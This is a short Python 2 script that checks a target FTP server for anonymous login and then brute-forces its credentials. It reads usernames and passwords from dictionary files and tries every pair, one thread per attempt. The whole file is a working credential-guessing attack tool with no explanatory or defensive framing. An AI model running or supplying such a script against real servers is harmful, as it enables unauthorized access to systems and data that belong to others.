import optparse
import ftplib
import threading
import socket
#screen_lock = threading.Semaphore(value=1)
def anonyLogin(host):
    try:
        ftp = ftplib.FTP(host)
        ftp.connect(host, 21, timeout = 10)
        ftp.login('anonymous', 'test@qq.com')
        ftp.retrlines('LIST')
        ftp.quit()
        print '\n[*]' + str(host) + ' FTP Anonymous Logon Succeeded.'
    except Exception, e:
        print '\n[-] ' + str(host) + ' FTP Anonymous Logon Failed.'
def ftpLogin(host, userName, password):
    try:
        #screen_lock.acquire()
        print '[-] Trying: ' + userName + '/' +password
        #screen_lock.release()
        ftp = ftplib.FTP(host)
        ftp.connect(host, 21, timeout = 10)
        ftp.login(userName, password)
        ftp.retrlines('LIST')
        ftp.quit()
        print 'Succeeded'
    except ftplib.all_errors:
        pass
def bruteForce(host, usersFile, pwdFile):
    userfn = open(usersFile, 'r')
    pwdfn = open(pwdFile, 'r')
    for user in userfn.readlines():
        # Reset the pwdfn filepointer(0)
        pwdfn.seek(0)
        for passwd in pwdfn.readlines():
            userName = user.strip('\n')
            passWord = passwd.strip('\n')
            t = threading.Thread(target=ftpLogin, args=(host, userName, passWord))
            child = t.start()
def main():
    parser = optparse.OptionParser('usage%prog -H <target host> -u <users dictionary> -p <password dictionary>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify the host')
    parser.add_option('-u', dest='userDic', type='string', help='specify the dictionary for user')
    parser.add_option('-p', dest='pwdDic', type='string', help='specify the dictionary for password')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    userDic = options.userDic
    pwdDic = options.pwdDic
    try:
        tgthost = socket.gethostbyname(host)
    except:
        print "[-] Cannot Resolve '%s': Unknown host" %host
        exit(0)
    anonyLogin(tgthost)
    bruteForce(tgthost, userDic, pwdDic)
if __name__ == '__main__':
    main()
